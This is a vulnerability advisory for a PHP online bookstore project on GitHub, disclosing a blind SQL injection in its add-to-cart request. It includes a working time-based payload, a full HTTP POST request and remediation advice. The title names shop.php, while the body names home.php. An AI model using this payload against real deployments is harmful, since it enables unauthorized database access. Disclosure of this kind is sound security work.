# keerti1924 / Online-Book-Store-Website - shop.php Blind SQL Injection

## Vendor Homepage:
[Online-Book-Store-Website](https://github.com/keerti1924/Online-Book-Store-Website)

## Impact
The 'home.php' script in keerti1924's Online-Book-Store-Website is vulnerable to Blind SQL Injection attacks. An attacker could exploit this vulnerability to execute arbitrary SQL queries on the underlying database, potentially leading to unauthorized access to sensitive information or data manipulation.

## Proof of Concept
Step 1: Login as a normal user\
Step 2: Make a Post request to home.php  with the following payload "add_to_cart=1&product_name=asdasd'+UNION+SELECT+SLEEP(10),NULL,NULL,NULL,NULL,NULL+%23&product_price=123&product_quantity=1&product_image=1"\
Step 3: Submit the request and observe a 10-second delay in the response.\

## HTTP Request Example
``` http request
POST /home.php HTTP/1.1
Host: [REDACTED]
Content-Length: 139
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: [REDACTED]
Connection: close

add_to_cart=1&product_name=asdasd'+UNION+SELECT+SLEEP(10),NULL,NULL,NULL,NULL,NULL+%23&product_price=123&product_quantity=1&product_image=1
```

## Proof with screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/ed48126c-7fbc-4150-910d-438d81037bed)


## Remidiation
To mitigate this issue, developers should implement proper input validation and parameterized queries to prevent SQL injection attacks. Additionally, limiting the privileges of the database user used by the application and enforcing least privilege principles can further reduce the impact of SQL injection vulnerabilities.

## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
